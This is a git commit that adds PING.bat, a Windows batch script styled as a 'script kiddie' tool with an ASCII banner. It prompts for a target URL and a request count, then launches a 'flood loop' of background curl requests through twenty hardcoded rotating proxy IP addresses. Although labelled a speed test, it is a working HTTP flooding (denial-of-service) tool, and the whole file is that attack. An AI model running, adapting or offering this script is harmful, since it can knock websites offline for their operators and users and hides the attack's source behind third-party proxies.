d9d435eb72be75fbe18e2e3712d28c83c43da88e
B3kxDev <B3KXbii@gmail.com>
2025-06-23 20:59:19 -0500

    Add files via upload

---
+++ PING.bat
@@ -0,0 +1,128 @@
+@echo off
+title imma kiss you twin
+color 9
+chcp 65001 > nul
+cls
+:: ===== Banner =====
+@echo off
+echo.  ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡀⠀⠀⠀⠀
+echo.  ⠀⠐⠂⠈⠉⠉⠉⠁⠀⠀⠀⢀⣀⠤⠟⠛⠉⠉⠐⠒⠀⠀⠀⠀⢸⠀⠀⠀⠀⠀⠀⠀⠀⠰⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠲⢄⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+echo.  ⠀⠀⠀⠀⠀⠀⠀⠀⣀⠤⠒⠉⠙⠦⠤⠀⣀⡀⠀⠀⠀⢀⡞⠀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠱⣤⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⢦⡀⠀⠀⠀⠀⠀⠀⠀
+echo.  ⠀⠀⠀⠀⠀⠀⣠⠔⠊⠁⠀⠀⣀⠔⠀⠀⠀⠀⠀⠀⠀⢠⠋⠉⠉⡇⠀⠀⡄⠀⠀⠀⢀⣀⣀⣉⣉⣇⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⢆⠀⠀⠀⠀⠀⠀
+echo.  ⠀⠀⠀⠀⡠⠚⠁⠀⠀⠀⣠⠞⠁⠀⠀⠀⠀⠀⠀⠀⢠⠏⢀⣀⣠⡧⢶⠆⡇⠀⠀⠉⠀⣿⣤⠀⠀⢹⡜⡆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢧⠀⠀⠀⠈⢣⠀⠀⠀⠀⠀
+echo.  ⠀⡠⠊⠀⠀⠀⠀⢀⡜⠁⠀⠀⠀⠀⠀⠀⣀⠤⣴⠞⠉⠁⢠⠏⡇⢸⠀⢰⠀⠀⠀⠀⣿⣿⡄⠀⠀⢧⠘⡆⠀⠀⠀⠀⠀⠀⠘⡆⠀⠈⢣⠀⠀⠀⠀⢣⠀⠀⠀⠀
+echo.  ⠘⠁⠀⠀⠀⢀⣤⠋⠀⠀⠀⣀⡤⠔⠊⠉⠀⡴⡿⠀⠀⢠⢯⠆⡇⢸⠀⢸⠀⠀⠀⠀⠙⢸⠹⡄⠀⠸⣆⠸⡄⠀⠀⠀⠀⠀⠀⠸⡄⠀⠈⢧⠀⠀⠀⠈⣆⠀⠀⠀
+echo.  ⠀⠀⢀⡤⠚⢩⠃⣀⠞⠚⠉⢠⠃⠀⠀⠀⡼⢡⠃⠀⢀⠏⠀⠀⠃⢸⣇⠈⡇⠀⠀⠀⠀⢸⠀⢳⡀⠀⢏⢧⠹⡀⠀⠀⠀⠀⠀⠀⢳⠀⠀⠈⢇⠀⠀⠀⠸⡀⠀⠀
+echo.  ⠀⠚⠁⠀⢀⡟⢉⠏⠀⠀⢀⡏⠀⠀⠀⣸⠁⡼⠀⢀⡞⠀⠀⠀⢸⢸⠘⡆⢧⠀⠀⠀⠀⢸⠀⠀⢣⣀⣸⡀⢳⡱⠀⠀⠀⠀⠀⠀⠈⣧⠀⠀⠘⡆⠀⠀⠀⣇⠀⠀
+echo.  ⠀⠀⠀⠀⡼⠀⡞⠀⠀⢠⡾⠀⠀⠀⢠⠃⢀⣧⠤⡾⠓⠛⠛⠀⠸⣾⠀⠘⣾⠀⠀⠀⠀⣾⠀⠀⠈⢯⠉⡏⠉⢻⡦⢤⡀⠀⠀⠀⠀⢸⣧⠀⠀⢹⠀⠀⠀⢹⠀⠀
+echo.  ⠀⠀⠀⢠⠃⡼⠀⠀⢀⡎⡇⠀⠀⠀⡎⠒⢻⠁⢠⠁⠀⠀⠀⠀⠀⣿⠀⠀⠹⣇⠀⠀⠀⢻⠀⠀⠀⠈⢣⣱⠀⠀⢳⣄⠈⠑⠂⠀⠀⠀⢏⢣⠀⠀⡇⠀⠀⢸⠀⠀
+echo.  ⠀⠀⠀⣸⢠⠃⠀⠀⡼⢰⡇⠀⠀⢸⠃⠀⢸⠀⡏⠀⠀⠀⠀⠀⠀⢸⠀⠀⠀⠹⡄⠀⠀⢸⠀⠀⠀⠀⠈⢻⡆⠀⠀⠻⡄⠀⠀⠀⠀⠀⢸⡈⢇⠀⢸⠀⠀⢸⠀⠀
+echo.  ⠀⠀⠀⡇⡾⠀⠀⢠⠇⢸⡇⠀⠀⡞⠀⠀⡟⣴⠀⠀⠀⠀⠀⠀⠀⠘⡇⠀⠀⠀⢳⠀⠀⢸⠀⠀⠀⠀⠀⠀⠃⠀⠀⠀⠹⡀⠀⠀⠀⠀⠈⣷⡜⡄⠘⡀⠀⢸⠀⠀
+echo.  ⠀⠀⠀⣧⠇⠀⠀⣼⠀⢸⡇⠀⢠⡇⠀⢸⠁⡟⠀⠀⠀⠤⠤⠤⠄⠀⢃⠀⠀⠀⠈⣆⠀⢸⠀⠀⠊⠉⠉⠉⠉⠀⠀⠀⠀⢳⡀⠀⠀⠀⠀⡇⢱⡰⠀⡇⠀⣸⠀⠀
+echo.  ⠀⠀⠀⢹⠀⠀⠀⡇⢀⡏⡇⠀⢸⠃⠀⣿⠀⠀⠀⠀⣀⣀⣀⣀⣤⣤⣼⠀⠀⠀⠀⠘⡄⢸⠀⠐⠿⣷⣶⣶⣶⣶⣶⣦⣤⣴⢧⠀⠀⠀⠀⣇⣀⣳⠀⣷⠀⡟⠀⠀
+echo.  ⠀⠀⠀⢸⠀⠀⢰⠁⣸⠀⢣⠀⢸⠀⠀⡏⣇⠻⢿⣻⣿⠿⠿⠟⠛⠋⠀⠀⠀⠀⠀⠀⠻⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠒⣼⠈⢧⠀⠀⠀⡇⠀⢹⣇⢹⠀⡇⠀⠀
+echo.  ⠀⠀⠀⢸⠀⠀⢸⢀⠇⠀⠸⡄⢸⠀⢸⢿⢸⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡏⢀⡇⠸⡄⢸⠃⠀⢸⢀⢹⣾⠀⠀⠀
+echo.  ⠀⠀⠀⠀⡆⠀⡿⣼⠀⠀⠀⢇⢸⠀⢸⢸⠈⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡏⣸⠀⠀⣵⣸⣀⠴⠃⢸⠀⡏⠀⠀⠀
+echo.  ⠀⠀⠀⠀⢷⠀⣇⡇⠀⠀⠀⠸⡾⡆⡾⢸⠀⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⣀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢰⢁⡇⠀⠀⡟⠻⠁⠀⠀⠈⠀⣇⠀⠀⡀
+echo.  ⠀⠀⠀⠀⠀⢧⢸⠀⠀⠀⠀⠀⠀⣣⣏⣿⠀⠈⠓⢤⣀⠀⠀⠀⠀⠀⠀⠀⢰⣉⣀⣀⣈⠉⢲⠀⠀⠀⠀⠀⠀⠀⢀⡠⢾⡼⠀⠀⢠⡇⠀⠀⠀⠀⠀⣿⠀⠀⠀⠀
+echo.  ⠀⠀⠀⠀⠉⠙⣾⠉⠉⠉⠁⠀⠀⠈⠧⢸⡀⠀⠀⠀⡏⠙⡖⠦⢤⣀⡀⠀⠀⠀⠀⠀⠈⠶⠋⠀⠀⠀⣀⣠⠤⡞⠉⠀⣾⠃⠀⢠⢿⠇⠀⠀⠀⠀⠀⡟⠀⠀⠀⠀
+echo.  ⠀⠀⠀⠀⠀⠀⠉⠀⠀⠀⠀⠀⠀⠀⠀⢸⢻⠀⠀⠀⡇⢠⡇⠀⠀⠀⠙⡟⠒⠢⢤⡤⠤⠤⠔⠒⠊⢹⠁⠀⠀⡇⠀⠀⡟⠀⣠⠃⢸⠀⠀⠀⠀⠀⠀⡇⠀⠀⠀⠀
+echo.  ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⠘⡄⠀⠀⡇⢸⠀⠀⠀⠀⠀⣧⣠⡤⣼⡀⠀⠀⠀⠀⠀⣼⠒⠦⢤⡇⠀⣼⠁⡴⠁⠀⣼⠀⠀⠀⠀⠀⠀⡇⠀⠀⠀⠀
+echo.  ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡈⠀⢧⠀⠀⡇⢸⠀⠀⠀⢀⡼⠋⢰⣦⠟⠃⠀⠀⠀⠀⠀⠙⢦⠆⠀⠙⣶⣧⠎⠀⠀⠀⡿⡇⠀⠀⠀⠀⠀⣧⠀⠀⠀⠀
+echo.  ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡇⠀⠘⡆⠀⡇⣞⢀⣠⠔⢫⠀⠀⢾⠀⠀⠀⠀⠀⠀⠀⠀⢠⠏⠀⢀⣴⠏⠀⠀⠀⠀⢰⠃⣇⠀⠀⠀⠀⠀⢸⠀⠀⠀⠀
+echo.  ⠀⠀⠀⠀⠀⠀⡤⠒⣆⠀⠀⠀⠀⠀⡇⠀⠀⠹⣰⠃⣿⣹⡄⠀⠈⢣⡀⣿⡤⠔⠒⠚⠓⠒⠢⣴⢏⣠⠔⠋⡟⠀⠀⠀⠀⠀⣼⣿⣾⡀⠀⠀⠀⠀⢸⠀⠀⠀⠀
+echo.  ⠀⠀⠀⠀⠀⠀⠘⢦⢾⡀⠀⠀⠀⢀⡇⠀⠀⠀⢻⣅⡿⣷⢳⡀⠀⠀⠙⡏⠀⠀⠀⠀⠀⠀⣰⠛⠉⠀⠀⡼⠀⠀⠀⠀⠀⢀⡿⠛⣉⣽⡆⠀⠀⠀⠀⡆⠀⠀⠀
+echo.  ⠀⠀⠀⠀⠀⠀⠀⠸⡆⢣⠀⠀⠀⢸⡇⠀⠀⠀⢸⢹⣧⣻⣧⢣⠀⠀⠀⡇⠀⠀⠀⠀⠀⣰⠃⠀⢀⣤⣾⠃⠀⠀⠀⠀⠀⡼⠚⠉⠀⠀⠘⢆⠀⠀⠀⡇⠀⠀⠀
+echo.  ⠀⠀⠀⠀⠀⠀⠀⠀⠹⡌⣇⠀⠀⡘⢳⠀⠀⠀⠈⣾⢻⣿⣻⣏⢧⠀⠀⢹⠀⠀⠀⠀⣰⢃⣤⣺⠟⣻⠇⠀⠀⠀⠀⠀⡼⠀⠀⠀⠀⠀⠀⠈⣇⠀⠀⣿⠀⠀⠀
+echo.  ⠀⠀⠀⠀⠀⠀⠀⡠⠚⠉⠉⠳⣤⡗⢻⠀⠀⠀⠀⡏⠀⢻⣷⣿⣯⢧⠀⢸⠀⠀⠀⣴⣛⠵⣫⢔⣫⡟⠀⠀⠀⠀⠀⡴⠁⠀⠀⠀⠀⠀⠀⠀⢸⡀⠀⢸⠀⠀⠀
+echo.  ⠀⠀⠀⠀⠀⠀⢀⡜⢀⣀⡀⢀⡠⢹⡉⢻⠀⠀⠀⠀⡇⠀⠀⠹⣿⣿⣯⣷⣸⠀⠀⣼⣛⣵⣫⣶⠿⢻⠃⠀⠀⠀⠀⡼⠀⠀⠀⠀⠀⠀⠀⠀⠀⡇⠀⠸⡀⠀⠀
+echo.  ⠀⠀⠀⠀⠀⠀⡎⠀⠉⠀⠉⠙⢦⣰⠃⢸⡇⠀⠀⠀⢻⠀⡸⠀⠹⣿⣟⢿⣿⡄⣼⣻⣿⠟⠋⠀⠀⡸⠀⠀⠀⢀⡞⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢳⡀⠀⡇⠀⠀
+echo.  ⠀⠀⠀⠀⠀⣸⠀⠀⠀⠀⠀⠀⠀⢹⣇⢸⣧⡶⡀⠀⠘⣤⠇⠀⣀⠨⢿⣮⢻⣿⡿⠟⠒⠒⠒⠤⣀⡇⠀⠀⢀⣾⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠳⡀⡇⠀⠀
+echo.
+echo.           {!} you think i know what i'm doing? i'm just a script kiddie lol  {1}
+echo.
+echo.
+echo.
+:: ===== User Input =====
+set /p TARGET=Enter target URL (e.g. https://example.com): 
+set /p ITERATIONS=Enter number of requests to send: 
+set TIMEOUT=0.5 
+set MAX_THREADS=1000
+
+:: ===== Proxy List =====
+set PROXY1=91.234.35.43:3128
+set PROXY2=45.77.58.137:8080
+set PROXY3=103.124.108.156:8080
+set PROXY4=185.199.229.156:7492
+set PROXY5=176.9.119.170:8080
+set PROXY6=104.236.198.185:3128
+set PROXY7=45.32.126.105:3128
+set PROXY8=138.197.157.32:8080
+set PROXY9=165.227.83.148:8080
+set PROXY10=159.203.44.177:3128                               
+set PROXY11=51.158.68.133:8811
+set PROXY12=51.158.68.26:8811
+set PROXY13=51.158.68.148:8811
+set PROXY14=163.172.31.44:8811
+set PROXY15=51.15.132.207:8811
+set PROXY16=51.15.132.107:8811
+set PROXY17=51.15.132.177:8811
+set PROXY18=51.15.132.187:8811
+set PROXY19=51.15.132.197:8811
+set PROXY20=51.15.132.217:8811
+
+:: Check curl exists
+where curl >nul 2>&1 || (
+    echo [ERROR] curl not found. Install from curl.se/windows/
+    pause
+    exit /b
+)
+
+cls
+echo.
+echo [*] Starting MAX SPEED test with %ITERATIONS% iterations...
+echo [*] Target: %TARGET%
+echo [*] Threads: %MAX_THREADS%
+echo [*] Proxies: 20 rotating
+echo.
+echo Press any key to begin...
+pause >nul
+
+setlocal enabledelayedexpansion
+set /a count=0
+
+:: Create worker script
+echo @echo off > worker.bat
+echo curl -x http://%%1 --connect-timeout %TIMEOUT% -I "%TARGET%" ^>nul 2^>^&1 >> worker.bat
+echo echo [+] Request %%2 via %%1 completed >> worker.bat
+
+:: Main flood loop
+:FLOOD
+if !count! geq %ITERATIONS% goto DONE
+
+:: Get random proxy
+set /a proxy_num=!random! %%20 +1
+for %%A in (PROXY!proxy_num!) do set proxy=!%%A!
+
+:: Launch worker
+start /B "" cmd /c "worker.bat "!proxy!" !count!"
+
+set /a count+=1
+if !count! lss %ITERATIONS% (
+    cls
+    echo.
+    echo [*] Requests sent: !count! / %ITERATIONS%
+    echo [*] Target: %TARGET%
+    echo [*] Press Ctrl+C to stop
+)
+goto FLOOD
+
+:DONE
+:: Cleanup
+timeout /t 3 >nul
+del worker.bat
+cls
+echo.
+echo [⚡] TEST COMPLETED
+echo [⚡] Total requests: !count!
+pause
